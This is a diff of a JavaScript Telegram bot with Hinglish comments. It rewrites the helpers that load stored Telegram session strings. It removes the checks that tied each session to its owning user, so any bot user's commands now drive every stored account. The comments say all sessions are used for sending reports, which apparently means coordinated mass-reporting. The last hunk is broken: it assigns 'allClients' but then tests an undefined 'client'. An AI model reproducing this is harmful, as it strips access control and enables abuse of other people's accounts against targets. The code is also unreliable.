@@ -120,100 +120,89 @@ setInterval(() => {
   }
 }, 60 * 1000).unref?.();
 
-function readSessions() {
+
+// Ek session (Round-Robin) — /lovedev ke liye
+// ---------- Telegram session helpers (report flow) ----------
+
+// data.json ke tgSessions se saare valid session strings (duplicate hata kar)
+function getTGSessionStrings() {
   try {
-    const filePath = path.join(LoveDir, 'data.json');
+    const db = getDB();
+    const sessions = Array.isArray(db.tgSessions) ? db.tgSessions : [];
 
-    console.log('📂 DB Path:', filePath);
-    console.log('📂 File Exists:', fs.existsSync(filePath));
-
-    if (!fs.existsSync(filePath)) return { allSessions: [], sessionStrings: [] };
-
-    const rawData = fs.readFileSync(filePath, 'utf-8');
-    const jsonData = JSON.parse(rawData);
-
-    const allSessions = Array.isArray(jsonData.tgSessions) ? jsonData.tgSessions : [];
-
-    // Har session string ek hi baar (duplicate ho to skip)
-    const sessionStrings = [...new Set(
-      allSessions
-        .map(item => (typeof item === 'string' ? item : item?.session || item?.sessionString))
-        .filter(s => typeof s === 'string' && s.length > 0)
+    const strings = [...new Set(
+      sessions
+        .map(item => (typeof item === 'string' ? item : item && item.session))
+        .filter(s => typeof s === 'string' && s.trim().length > 0)
     )];
 
-    console.log('📊 Session Count:', allSessions.length, '| Valid:', sessionStrings.length);
-
-    return { allSessions, sessionStrings };
+    log('info', 'Telegram', `Sessions found: ${sessions.length} | usable: ${strings.length}`);
+    return strings;
   } catch (err) {
-    console.error('❌ Session Read Error:', err);
-    return { allSessions: [], sessionStrings: [] };
+    log('error', 'Telegram', 'Session Read Error: ' + err.message);
+    return [];
   }
-}
-
-// Session kis user ka hai? Pata na ho to null (matlab: reject mat karo)
-function sessionOwner(item, userId) {
-  if (typeof item === 'string') return null;
-  const uid = item?.userId ?? item?.user_id ?? item?.id;
-  return uid == null ? null : String(uid) === String(userId);
-}
-
-function ownsAnySession(allSessions, userId) {
-  const known = allSessions.map(item => sessionOwner(item, userId)).filter(v => v !== null);
-  if (known.length === 0) return true;  // sab plain strings → isi user ke maano
-  return known.some(Boolean);           // sirf tab reject jab id pata ho aur match na kare
 }
 
 async function connectSession(sessionStr) {
   let client = activeClients.get(sessionStr);
-  if (!client) {
-    client = new TelegramClient(new StringSession(sessionStr), apiId, apiHash, {
-      connectionRetries: 5,
-    });
-    await client.connect();
-    activeClients.set(sessionStr, client);
-  } else if (!client.connected) {
-    await client.connect();
+
+  if (client) {
+    if (!client.connected) {
+      try {
+        await client.connect();
+        return client;
+      } catch (err) {
+        activeClients.delete(sessionStr);
+        try { await client.disconnect(); } catch (e) {}
+      }
+    } else {
+      return client;
+    }
   }
+
+  client = new TelegramClient(
+    new StringSession(sessionStr),
+    Number(TG_API_ID),
+    TG_API_HASH,
+    { connectionRetries: 5 }
+  );
+
+  await client.connect();
+  activeClients.set(sessionStr, client);
   return client;
 }
 
-// Ek session (Round-Robin) — /lovedev ke liye
-async function getTGClient(userId) {
+// /lovedev ke liye — ek session (round robin)
+async function getTGClient() {
+  const strings = getTGSessionStrings();
+  if (strings.length === 0) return null;
+
+  const sessionStr = strings[rrIndex % strings.length];
+  rrIndex++;
+
   try {
-    const { allSessions, sessionStrings } = readSessions();
-    if (sessionStrings.length === 0) return null;
-    if (!ownsAnySession(allSessions, userId)) return null;
-
-    const sessionStr = sessionStrings[rrIndex % sessionStrings.length];
-    rrIndex++;
-
     return await connectSession(sessionStr);
   } catch (err) {
-    console.error('Session Load Error:', err);
+    log('error', 'Telegram', 'Session Connect Error: ' + err.message);
     return null;
   }
 }
 
-// Saare sessions — report bhejne ke liye
-async function getTGClients(userId) {
-  try {
-    const { allSessions, sessionStrings } = readSessions();
-    if (sessionStrings.length === 0) return [];
-    if (!ownsAnySession(allSessions, userId)) return [];
+// Report ke liye — SAARE sessions
+async function getTGClients() {
+  const strings = getTGSessionStrings();
+  const clients = [];
 
-    const clients = [];
-    for (const sessionStr of sessionStrings) {
-      try {
-        clients.push(await connectSession(sessionStr));
-      } catch (err) {
-        console.error('Session Connect Error:', err); // yeh session skip, baaki chalenge
-      }
+  for (const sessionStr of strings) {
+    try {
+      clients.push(await connectSession(sessionStr));
+    } catch (err) {
+      log('error', 'Telegram', 'Session Connect Error (skipped): ' + err.message);
     }
-    return clients;
-  } catch (err) {
-    console.error('Session Load Error:', err);
-    return [];
   }
+
+  return clients;
 }
 
 
@@ -1708,7 +1697,7 @@ SYLoVe('lovedev', async (msg) => {
 
   if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
 
-  const client = await getTGClient(userId);
+  const allClients = await getTGClients();   // pehle: getTGClients(reportUserId)
   if (!client) {
     return S7.sendMessage(chatId, '❌ Pehle /logintg se apna Telegram account connect karo.');
   }
